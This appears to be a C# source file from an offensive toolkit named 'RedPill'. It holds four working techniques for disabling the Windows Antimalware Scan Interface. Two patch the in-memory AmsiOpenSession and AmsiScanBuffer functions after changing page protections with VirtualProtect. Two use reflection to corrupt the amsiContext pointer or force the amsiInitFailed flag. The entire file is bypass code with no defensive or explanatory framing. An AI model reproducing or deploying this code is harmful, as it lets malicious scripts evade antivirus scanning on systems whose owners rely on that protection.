using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq.Expressions;
using System.Text;
using System.Threading.Tasks;

namespace RedPill
{
    public class DetectAndDisable
    {
        public static Type lookedClass;
        public static Type nativeClass;
        public static Assembly systemLocation;
        public static MethodInfo getProcAddress;
        public static MethodInfo getModuleHandle;
        public static IntPtr amModuleHandle;
        public static IntPtr kernelModuleHandle;
        public static byte[] patch = new byte[] { 0x48, 0x31, 0xC0 };
        public delegate void virtualProtectDelegate(IntPtr p1, UInt32 p2, UInt32 p3, ref UInt32 p4);

        public static void locateUtilsClass()
        {
            foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
            {
                foreach(Type c in assembly.GetTypes())
                {
                    if (c.Name.Contains("siUtils"))
                    {
                        lookedClass = c;
                    }
                    
                    
                }
            }
        }
        public static void locateSystem()
        {

            Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
            foreach (Assembly a in assemblies)
            {

                if (a.FullName.Split(',')[0] == "System")
                {
                    systemLocation =a;

                }
            }
        }

        public static void PatchOpenSession()
        {
            locateSystem();
            nativeClass = systemLocation.GetType("Microsoft.Win32.UnsafeNativeMethods");
            getProcAddress = nativeClass.GetMethod("GetProcAddress", new Type[] { typeof(IntPtr), typeof(string) });
            getModuleHandle = nativeClass.GetMethod("GetModuleHandle");
            amModuleHandle = (IntPtr)getModuleHandle.Invoke(null, new object[] { "Amsi.dll" });
            IntPtr AmsiOpenSession = (IntPtr)getProcAddress.Invoke(null, new object[] { amModuleHandle, "AmsiOpenSession" });
            kernelModuleHandle = (IntPtr)getModuleHandle.Invoke(null, new object[] { "kernel32.dll" });
            IntPtr virtualProcHandle = (IntPtr)getProcAddress.Invoke(null, new object[] { kernelModuleHandle, "VirtualProtect" });
            virtualProtectDelegate vp = (virtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(virtualProcHandle, typeof(virtualProtectDelegate));
            UInt32 oldProtect=0;
            vp.Invoke(AmsiOpenSession, 3, 0x40, ref oldProtect);//change memory page permisssion
            Marshal.Copy(patch,0, AmsiOpenSession,3);
            vp.Invoke(AmsiOpenSession, 3, 0x20, ref oldProtect); //restore memory permission
        }
        public static void PatchScanBuffer()
        {
            locateSystem();
            nativeClass = systemLocation.GetType("Microsoft.Win32.UnsafeNativeMethods");
            getProcAddress = nativeClass.GetMethod("GetProcAddress", new Type[] { typeof(IntPtr), typeof(string) });
            getModuleHandle = nativeClass.GetMethod("GetModuleHandle");
            amModuleHandle = (IntPtr)getModuleHandle.Invoke(null, new object[] { "Amsi.dll" });
            IntPtr AmsiScanBuffer = (IntPtr)getProcAddress.Invoke(null, new object[] { amModuleHandle, "AmsiScanBuffer" });
            kernelModuleHandle = (IntPtr)getModuleHandle.Invoke(null, new object[] { "kernel32.dll" });
            IntPtr virtualProcHandle = (IntPtr)getProcAddress.Invoke(null, new object[] { kernelModuleHandle, "VirtualProtect" });
            virtualProtectDelegate vp = (virtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(virtualProcHandle, typeof(virtualProtectDelegate));
            UInt32 oldProtect = 0;
            vp.Invoke(AmsiScanBuffer+0x6a, 3, 0x40, ref oldProtect);//change memory page permisssion
            Marshal.Copy(patch, 0, AmsiScanBuffer + 0x6a, 3);
            vp.Invoke(AmsiScanBuffer + 0x6a, 3, 0x20, ref oldProtect); //restore memory permission
        }
        public static void modifyContext()
        {
            locateUtilsClass();
            FieldInfo[] fields = lookedClass.GetFields(BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
            Console.WriteLine(fields[0].GetValue(null));
            IntPtr contextPointer = (IntPtr)fields[0].GetValue(null);
            Int32[] corrupt = new int[] { 0 };
            Marshal.Copy(corrupt, 0, contextPointer, 1);
        } 
        public static void modifyInitFailed()
        {
            locateUtilsClass();
            FieldInfo[] fields = lookedClass.GetFields(BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
            fields[2].SetValue(null,true);
                       
        }
    }
}
